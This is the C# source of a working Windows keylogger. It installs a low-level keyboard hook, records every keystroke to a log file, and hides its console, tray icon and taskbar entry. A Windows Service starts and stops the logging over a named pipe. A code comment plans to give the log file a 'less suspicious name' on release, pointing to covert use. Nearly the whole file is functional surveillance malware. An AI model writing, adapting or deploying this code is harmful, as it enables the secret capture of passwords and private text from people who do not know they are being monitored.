using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using KeyloggerCommunications;
using System.ServiceModel;

namespace WTKL
{
    /* This class is the keylogger application. This application will be run by the user when
     * they login to their Windows user. Once it starts the application will sit idling until
     * it is signaled by the Windows Service to start keylogging. It will continue keylogging
     * until the Windows Service signals it to stop. Keylogging is done by using Windows hooks
     * to hook into the user input and capture all keyboard input and then pass it along to
     * the rest of the computer.
     */
    class SystemTrayKeylogger : Form, KeyloggerCommInterface
    {
        private const byte VK_BACKSPACE = 8;
        private const byte VK_TAB = 9;
        private const byte VK_ENTER = 13;
        private const byte VK_SHIFT = 16;
        private const byte VK_CONTROL = 17;
        private const byte VK_ALT = 18;
        private const byte VK_CAPS = 20;
        private const byte VK_ESC = 27;
        private const byte VK_SPACE = 32;
        private const byte VK_PAGE_UP = 33;
        private const byte VK_PAGE_DOWN = 34;
        private const byte VK_END = 35;
        private const byte VK_HOME = 36;
        private const byte VK_ARROW_LEFT = 37;
        private const byte VK_ARROW_UP = 38;
        private const byte VK_ARROW_RIGHT = 39;
        private const byte VK_ARROW_DOWN = 40;
        private const byte VK_PRINT_SCREEN = 44;
        private const byte VK_INSERT = 45;
        private const byte VK_DELETE = 46;
        private const byte VK_LWINDOWS = 91;
        private const byte VK_RWINDOWS = 92;
        private const byte VK_NUMLOCK = 144;
        private const byte VK_SCROLL_LOCK = 145;
        private const byte VK_LEFT_SHIFT = 160;
        private const byte VK_RIGHT_SHIFT = 161;
        private const byte VK_LEFT_CONTROL = 162;
        private const byte VK_RIGHT_CONTROL = 163;
        private const byte VK_LEFT_MENU = 164;
        private const byte VK_RIGHT_MENU = 165;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;

        private const string CTRL_STR = "CTRL";
        private const string ALT_STR = "ALT";
        private const string TAB_STR = "TAB";
        private const string SHIFT_STR = "SHIFT";
        private const string ENTER_STR = "ENTER";
        private const string BACKSPACE_STR = "BKSPC";
        private const string ESC_STR = "ESC";
        private const string WINDOWS_STR = "WINDOWS";
        private const string ARROW_UP_STR = "ARROWUP";
        private const string ARROW_DOWN_STR = "ARROWDN";
        private const string ARROW_LEFT_STR = "ARROWLT";
        private const string ARROW_RIGHT_STR = "ARROWRT";
        private const string INSERT_STR = "INSERT";
        private const string DELETE_STR = "DELETE";
        private const string HOME_STR = "HOME";
        private const string END_STR = "END";
        private const string PAGE_UP_STR = "PGUP";
        private const string PAGE_DOWN_STR = "PGDN";
        private const string PRINT_SCREEN_STR = "PRTSCRN";
        private const string SCROLL_LOCK_STR = "SCRLLCK";
        private const string NUM_LOCK_STR = "NUMLOCK";
        private const string CAPS_LOCK_STR = "CAPSLOCK";
        private const string SPACE_STR = "SPACE";

        private const string TEXT_FILE_NAME = "keylog.txt"; //todo give less suspicious name on final release

        const int SW_HIDE = 0;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static bool logging = false;
        private static StreamWriter textFileWriter;
        private static byte[] keyStates = new byte[256];
        private static string[] keyStrings = new string[256];

        private NotifyIcon trayIcon;
        private ContextMenu trayMenu;
        private ServiceHost host;

        /* The constructor creates the needed windows form components for the application
         * to run in the system tray.
         */
        public SystemTrayKeylogger()
        {
            trayIcon = new NotifyIcon();
            trayMenu = new ContextMenu();

            // hides console, remove if you want to start and stop via console
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            trayMenu.MenuItems.Add("Exit", OnExit);
            trayIcon.Text = "Tray application";
            trayIcon.Icon = new Icon(SystemIcons.Application, 40, 40);
            trayIcon.ContextMenu = trayMenu;
            trayIcon.Visible = false;
        }

        /* This method is the first method to be ran when the application starts. Just like
         * the service this can be thought of as the main method.
         */
        protected override void OnLoad(EventArgs e)
        {
            this.Visible = false;
            this.ShowInTaskbar = false;

            base.OnLoad(e);

            SetKeyStringsArray();

            CreateOpenPipe();

            //For debugging only
            //StartKeylogger();
        }

        /* Array of strings describing keys. A keys description is indexed by its
         * VK code.
         */
        private void SetKeyStringsArray()
        {
            keyStrings[VK_ARROW_DOWN] = ARROW_DOWN_STR;
            keyStrings[VK_ARROW_LEFT] = ARROW_LEFT_STR;
            keyStrings[VK_ARROW_RIGHT] = ARROW_RIGHT_STR;
            keyStrings[VK_ARROW_UP] = ARROW_UP_STR;
            keyStrings[VK_ALT] = ALT_STR;
            keyStrings[VK_BACKSPACE] = BACKSPACE_STR;
            keyStrings[VK_CAPS] = CAPS_LOCK_STR;
            keyStrings[VK_CONTROL] = CTRL_STR;
            keyStrings[VK_DELETE] = DELETE_STR;
            keyStrings[VK_END] = END_STR;
            keyStrings[VK_ENTER] = ENTER_STR;
            keyStrings[VK_ESC] = ESC_STR;
            keyStrings[VK_HOME] = HOME_STR;
            keyStrings[VK_INSERT] = INSERT_STR;
            keyStrings[VK_LWINDOWS] = WINDOWS_STR;
            keyStrings[VK_NUMLOCK] = NUM_LOCK_STR;
            keyStrings[VK_PAGE_DOWN] = PAGE_DOWN_STR;
            keyStrings[VK_PAGE_UP] = PAGE_UP_STR;
            keyStrings[VK_PRINT_SCREEN] = PRINT_SCREEN_STR;
            keyStrings[VK_RWINDOWS] = WINDOWS_STR;
            keyStrings[VK_SCROLL_LOCK] = SCROLL_LOCK_STR;
            keyStrings[VK_SHIFT] = SHIFT_STR;
            keyStrings[VK_SPACE] = SPACE_STR;
            keyStrings[VK_TAB] = TAB_STR;
        }

        /* This is the method that is called just before the application stops running,
         * calls to save and close connections should be put here.
         */
        private void OnExit(object sender, EventArgs e)
        {
            ClosePipe();
            Application.Exit();
        }

        /* This method is here to make sure that the system tray icon is properly disposed
         * of so it disappears as soon as the application is closed.
         */
        protected override void Dispose(bool isDisposing)
        {
            if (isDisposing)
            {
                trayIcon.Dispose();
            }
            base.Dispose(isDisposing);
        }

        //Simply starts the application running, the first method called after this is OnLoad.
        [STAThread]
        public static void Main()
        {
            Application.Run(new SystemTrayKeylogger());
        }

        /* This method creates a new pipe to connect with the Windows Service and then opens
         * the connection.
         */
        private void CreateOpenPipe()
        {
            host = new ServiceHost(typeof(SystemTrayKeylogger));
            host.AddServiceEndpoint(typeof(KeyloggerCommInterface), new NetNamedPipeBinding(), "net.pipe://localhost/PipeKeylogger"); //todo make constant, preferably in interface if posile so any class that uses it will always have the same name available
            host.Open();
        }

        //Closes the connection between the Windows Service and this application
        private void ClosePipe()
        {
            host.Close();
        }

        /* Starts the keylogger. This is one of the methods that is publicly exposed by the
         * KeyloggerCommInterface and is called over the pipe.
         */
        public bool StartKeylogger()
        {
            if (!logging)
            {
                _hookID = SetHook(_proc);
                logging = true;
            }
            return logging;
        }

        /* Stops the keylogger. This is one of the methods that is publicly exposed by the
         * KeyloggerCommInterface and is called over the pipe.
         */
        public bool StopKeylogger()
        {
            if (logging)
            {
                UnhookWindowsHookEx(_hookID);
                logging = false;
            }
            return logging;
        }

        /* Simply returns true just to let the Windows Service know that it is running. This always
         * returns true because if it's not running then there will be no application to connect to.
         * Need to make sure there's proper error handling being done on the Windows Service side
         * of this method.
         */
        public bool CheckIfRunning()
        {
            return true;
        }

        /* Returns the file path of the keylog text file to the Windows Service.
         */
        public string GetKeylogFilePath()
        {
            return System.AppDomain.CurrentDomain.BaseDirectory.ToString() + TEXT_FILE_NAME;
        }

        /* Delegate for use with callback methods. The variable _proc is created of this type and
         * set equal to the HookCallback method. Whenever there is user input the _proc variable
         * is used to call the HookCallback function.
         */
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, ref keyboardHookStruct lParam);

        public struct keyboardHookStruct
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }

        private static void KeyStateHelper()
        {
            keyStates[VK_BACKSPACE] = ((GetKeyState(VK_BACKSPACE) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_TAB] = ((GetKeyState(VK_TAB) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_ENTER] = ((GetKeyState(VK_ENTER) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_SHIFT] = ((GetKeyState(VK_SHIFT) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_CONTROL] = ((GetKeyState(VK_CONTROL) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_ALT] = ((GetKeyState(VK_ALT) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_CAPS] = ((GetKeyState(VK_CAPS) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_ESC] = ((GetKeyState(VK_ESC) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_SPACE] = ((GetKeyState(VK_SPACE) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_PAGE_UP] = ((GetKeyState(VK_PAGE_UP) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_PAGE_DOWN] = ((GetKeyState(VK_PAGE_DOWN) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_END] = ((GetKeyState(VK_END) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_HOME] = ((GetKeyState(VK_HOME) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_PRINT_SCREEN] = ((GetKeyState(VK_PRINT_SCREEN) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_INSERT] = ((GetKeyState(VK_INSERT) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_DELETE] = ((GetKeyState(VK_DELETE) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_LWINDOWS] = ((GetKeyState(VK_LWINDOWS) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_RWINDOWS] = ((GetKeyState(VK_RWINDOWS) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
            keyStates[VK_NUMLOCK] = ((GetKeyState(VK_NUMLOCK) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
        }

        /* HookCallback is where the actual reading of user inputs takes place in our application.
         * The method is called by the delegate above whenever there is user input detected by
         * the operating system.
         */
        private static IntPtr HookCallback(int nCode, IntPtr wParam, ref keyboardHookStruct lParam)
        {
            string output = "";

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                byte[] keyboardArray = new byte[256];
                GetKeyState(0);
                GetKeyboardState(keyboardArray);

                //Logical OR the left and right keys with the regular key
                /*keyboardArray[VK_SHIFT] = (byte)(keyboardArray[VK_SHIFT] | keyboardArray[VK_LEFT_SHIFT] |
                    keyboardArray[VK_RIGHT_SHIFT]);

                keyboardArray[VK_CONTROL] = (byte)(keyboardArray[VK_CONTROL] | keyboardArray[VK_LEFT_CONTROL] |
                    keyboardArray[VK_RIGHT_CONTROL]);*/

                //If keycode is between a and z
                if (lParam.vkCode >= 65 && lParam.vkCode <= 90)
                {
                    byte[] asciiConvertBuffer = new byte[2];
                    if (ToAscii(lParam.vkCode, lParam.scanCode, keyboardArray, asciiConvertBuffer, lParam.flags) == 1)
                    {
                        char key = (char)asciiConvertBuffer[0];
                        //checks if any shift key is pressed and compares it to capslock to determine case
                        if (((keyboardArray[VK_SHIFT] | keyboardArray[VK_LEFT_SHIFT] |
                            keyboardArray[VK_RIGHT_SHIFT]) & 0x80) != 0 ^ (keyboardArray[VK_CAPS] & 0x01) != 0)
                        {
                            key = Char.ToUpper(key);
                        }
                        else
                        {
                            key = Char.ToLower(key);
                        }
                        output += key.ToString();
                    }
                }

                //If keycode is between numpad 0 and numpad 9
                else if (lParam.vkCode >= 96 && lParam.vkCode <= 105)
                {
                    if ((keyboardArray[VK_NUMLOCK] & 0x01) != 0)
                    {
                        char key;
                        byte[] asciiConvertBuffer = new byte[2];
                        if (ToAscii(lParam.vkCode, lParam.scanCode, keyboardArray, asciiConvertBuffer, lParam.flags) == 1)
                        {
                            key = (char)asciiConvertBuffer[0];
                            output += key.ToString();
                        }
                    }
                }

                //If keycode is a regular keyboard number
                else if (lParam.vkCode >= 48 && lParam.vkCode <= 57)
                {
                    if ((keyboardArray[VK_SHIFT] & 0x80) != 0)
                    {
                        switch (lParam.vkCode)
                        {
                            case 48: //0 key
                                output = ")";
                                break;
                            case 49: //1 key
                                output = "!";
                                break;
                            case 50: //2 key
                                output = "@";
                                break;
                            case 51: //3 key
                                output = "#";
                                break;
                            case 52: //4 key
                                output = "$";
                                break;
                            case 53: //5 key
                                output = "%";
                                break;
                            case 54: //6 key
                                output = "^";
                                break;
                            case 55: //7 key
                                output = "&";
                                break;
                            case 56: //8 key
                                output = "*";
                                break;
                            case 57: //9 key
                                output = "(";
                                break;
                        }
                    }

                    else
                    {
                        byte[] asciiConvertBuffer = new byte[2];
                        if (ToAscii(lParam.vkCode, lParam.scanCode, keyboardArray, asciiConvertBuffer, lParam.flags) == 1)
                        {
                            char key = (char)asciiConvertBuffer[0];
                            output = key.ToString();
                        }
                    }
                }

                //Capture "OEM" and arithmetic keyboard keys
                else if ((lParam.vkCode >= 186 && lParam.vkCode <= 191) ||
                    (lParam.vkCode >= 219 && lParam.vkCode <= 223) ||
                    (lParam.vkCode >= 106 && lParam.vkCode <= 111) ||
                    (lParam.vkCode == 192))
                {
                    byte[] asciiConvertBuffer = new byte[2];
                    if (ToAscii(lParam.vkCode, lParam.scanCode, keyboardArray, asciiConvertBuffer, lParam.flags) == 1)
                    {
                        char key = (char)asciiConvertBuffer[0];
                        output = key.ToString();
                    }
                }

                else if (lParam.vkCode == VK_SPACE)
                {
                    output = " ";
                }

                else // modifier keys
                {
                    output = getModifiers(lParam.vkCode, false);
                    if (output.Length > 0)
                    {
                        string temp;
                        for (int i = 0; i < keyboardArray.Length; i++)
                        {
                            if ((keyboardArray[i] & 0x80) != 0 && i != lParam.vkCode)
                            {
                                temp = getModifiers(i, true);
                                if (temp.Length > 0)
                                {
                                    output += " + " + temp;
                                }
                            }
                        }
                        output = "[" + output + "]";
                    }
                }

                textFileWriter = new StreamWriter(TEXT_FILE_NAME, true);
                textFileWriter.Write(output);
                textFileWriter.Close();
            }
            else if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
            {
            }
            return CallNextHookEx(_hookID, nCode, wParam, ref lParam);
        }

        /* Takes a keycode and returns the name of the key as a string if it is a modifier.
         * If it is not a modifier key it returns an empty string. Whether or not to include shift
         * can be toggled with the includeShift parameter.
         */
        private static string getModifiers(int keycode, bool includeShift)
        {
            string keyStr = "";
            switch (keycode)
            {
                case VK_BACKSPACE:
                    keyStr = keyStrings[keycode];
                    break;
                case VK_TAB:
                    keyStr = keyStrings[keycode];
                    break;
                case VK_ENTER:
                    keyStr = keyStrings[keycode];
                    break;
                /*case VK_CONTROL:
                    keyStr = keyStrings[VK_CONTROL];
                    break;*/
                case VK_LEFT_CONTROL:
                    keyStr = keyStrings[VK_CONTROL];
                    break;
                case VK_RIGHT_CONTROL:
                    keyStr = keyStrings[VK_CONTROL];
                    break;
                case VK_ALT:
                    keyStr = keyStrings[keycode];
                    break;
                /*case VK_LEFT_MENU:
                    keyStr = keyStrings[VK_ALT];
                    break;
                case VK_RIGHT_MENU:
                    keyStr = keyStrings[VK_ALT];
                    break;*/
                case VK_CAPS:
                    keyStr = keyStrings[keycode];
                    break;
                case VK_ESC:
                    keyStr = keyStrings[keycode];
                    break;
                case VK_PAGE_UP:
                    keyStr = keyStrings[keycode];
                    break;
                case VK_PAGE_DOWN:
                    keyStr = keyStrings[keycode];
                    break;
                case VK_END:
                    keyStr = keyStrings[keycode];
                    break;
                case VK_HOME:
                    keyStr = keyStrings[keycode];
                    break;
                case VK_ARROW_DOWN:
                    keyStr = keyStrings[keycode];
                    break;
                case VK_ARROW_LEFT:
                    keyStr = keyStrings[keycode];
                    break;
                case VK_ARROW_RIGHT:
                    keyStr = keyStrings[keycode];
                    break;
                case VK_ARROW_UP:
                    keyStr = keyStrings[keycode];
                    break;
                case VK_PRINT_SCREEN:
                    keyStr = keyStrings[keycode];
                    break;
                case VK_INSERT:
                    keyStr = keyStrings[keycode];
                    break;
                case VK_DELETE:
                    keyStr = keyStrings[keycode];
                    break;
                case VK_LWINDOWS:
                    keyStr = keyStrings[keycode];
                    break;
                case VK_RWINDOWS:
                    keyStr = keyStrings[keycode];
                    break;
                case VK_NUMLOCK:
                    keyStr = keyStrings[keycode];
                    break;
                case VK_SCROLL_LOCK:
                    keyStr = keyStrings[keycode];
                    break;
                default:
                    if (includeShift)
                    {
                        if (/*keycode == VK_SHIFT || */keycode == VK_RIGHT_SHIFT || keycode == VK_LEFT_SHIFT)
                        {
                            keyStr = keyStrings[VK_SHIFT];
                        }
                    }
                    break;
            }
            return keyStr;
        }

        /* This method is used to set our application's hook into the Windows keyboard
         * input hook chain. It is passed a delegate to be used to call our HookCallback
         * method so we can handle the captured inputs.
         */
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        /*******************************************************************************
         **************************** DLL Import References ****************************
         *******************************************************************************/
        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        private static extern int ToAscii(int keyCode, int scanCode, byte[] keyboardBuffer, byte[] translateBuffer, int flags);

        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        private static extern bool GetKeyboardState(byte[] keyboardBuffer);

        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        private static extern short GetKeyState(int virtualKeyCode);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); // Keys enumeration

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);

        [DllImport("User32.dll")]
        public static extern int GetWindowText(int hwnd, StringBuilder s, int nMaxCount);

        [DllImport("User32.dll")]
        public static extern int GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, ref keyboardHookStruct lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
}
